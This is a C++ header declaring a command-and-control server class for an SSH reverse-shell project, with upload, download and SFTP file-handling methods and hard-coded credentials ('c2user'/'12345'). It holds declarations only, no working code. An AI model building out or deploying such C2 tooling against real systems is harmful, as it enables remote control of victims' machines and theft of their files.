//
// Created by rip on 6/30/19.
//

#ifndef SSH_TCP_REVERSE_SHELL_CPP_C2SERVER_H
#define SSH_TCP_REVERSE_SHELL_CPP_C2SERVER_H

// this is for libssh to be able to
// use the server functions
#define WITH_SERVER

#include <iostream>
#include <thread>
#include "libssh/libssh.h"
#include "libssh/server.h"
#include "libssh/sftp.h"
#include <sys/stat.h>
#include <fcntl.h>
#include "utils.h"


#define MAX_BUFF_SIZE 50000
#define KEYS_FOLDER "/Users/rip/.ssh/"


class C2Server {

private:
    ssh_bind bind;
    ssh_session session;
    ssh_channel channel;
    const std::string host { "127.0.0.1" };
    const int port { 4433 };
    const std::string user { "c2user" };
    const std::string pwd { "12345" };
    bool isListening { false };
    std::thread listenerThread;

    void listen();
    void handleConnection();
    void tearDown();
    bool authenticate();
    bool openChannel();
    void sendMsg(const std::string&);
    std::string rcvMsg();
    void handleUpload(std::string&, std::string&);
    void handleDownload(std::string&, std::string&);

    // SFTP methods
    sftp_session setupSFTP();
    void handleFileOpen(const sftp_client_message&);
    void handleFileWrite(const sftp_client_message&);
    void handleFileRead(const sftp_client_message&);
    void handleFileClose(const sftp_client_message&);

public:
    C2Server();
    ~C2Server();

    void start();
    void stop();
};


#endif //SSH_TCP_REVERSE_SHELL_CPP_C2_H
